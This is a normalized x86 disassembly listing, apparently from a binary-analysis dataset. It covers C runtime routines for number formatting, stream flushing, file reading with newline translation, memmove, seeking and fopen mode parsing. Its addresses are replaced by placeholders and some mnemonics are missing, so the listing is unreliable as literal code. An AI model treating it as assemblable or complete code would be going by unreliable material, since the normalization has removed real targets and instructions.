call sub_40e700
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_40e690
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_40b933
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40b902
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_40b933
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_40b902
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40b902
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_40b933
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_40e61b
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_40b8cd
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_40b077
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_40b902
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_40b8cd
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_40b933
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_40b8cd
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40b979
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40e775
add esp 0x1c
test eax eax
jne r-xdata
sub_40b9f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40ba24
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40b979
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40e8be
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40baef
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_40ec68
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_40b010
pop ecx
jmp r-xdata
push 0x2
call sub_40ec68
push 0x1
mov ebp eax
call sub_40ec68
pop ecx
cmp eax ebp
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_40ec68
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_40ebee
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je r-xdata
sub_40bba2
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_4091a9
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40bbcd
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40bc08
test eax eax
pop ecx
je r-xdata
push esi
call sub_40bc6d
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40eca5
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_40bc08
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_40c6bf
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40bc6d
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_40bbcd
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_40bbcd
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_40bcda
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40e47b
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_40bdb3
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea edi [ edi + ecx * 8 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_40bdb3
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rw-data ]
mov eax [ eax * 4 + rw-data ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_40b010
pop ecx
jmp r-xdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40c2e5
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_40bfb0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40c010 ]
jmp [ ecx * 4 + jump_table_40c08c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c0f8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40c0f8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40c290 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40c198 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c290 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c0f8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c0f8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c0f8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40c290 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c290 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c290 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c290 ]
sub_40c2e5
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_40ec68
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp r-xdata
push eax
call sub_40b010
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_40c37f
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_40c2e5
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test dx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
test dl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl 0x80
jne r-xdata
mov edx esi
mov ebx esi
sar edx 0x5
and ebx 0x1f
mov edx [ edx * 4 + rw-data ]
test [ edx + ebx * 8 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ rw-data ] 0x16
mov edx ecx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
inc edx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax ecx
add eax edx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] edx
jmp r-xdata
cmp edx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_40c2e5
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_40c2e5
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_40c4d7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40ecfc
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_40c647
mov edx [ rw-data ]
push ebx
push ebp
push esi
xor ebp ebp
xor esi esi
xor eax eax
cmp edx ebp
push edi
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ rw-data ]
mov edi ebx
mov edi eax
push 0x20
shl edi 0x2
call sub_408e82
pop ecx
mov ecx [ rw-data ]
mov [ edi + ecx ] eax
mov eax [ rw-data ]
mov edi [ edi + eax ]
cmp edi ebp
je r-xdata
test [ ecx + 0xc ] 0x83
je r-xdata
mov esi edi
mov esi [ ebx + eax * 4 ]
jmp r-xdata
inc eax
add edi 0x4
cmp eax edx
jl r-xdata
or [ esi + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
mov [ esi + 0x1c ] ebp
cmp esi ebp
je r-xdata
mov ecx [ edi ]
cmp ecx ebp
je r-xdata
jmp r-xdata
sub_40c6bf
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
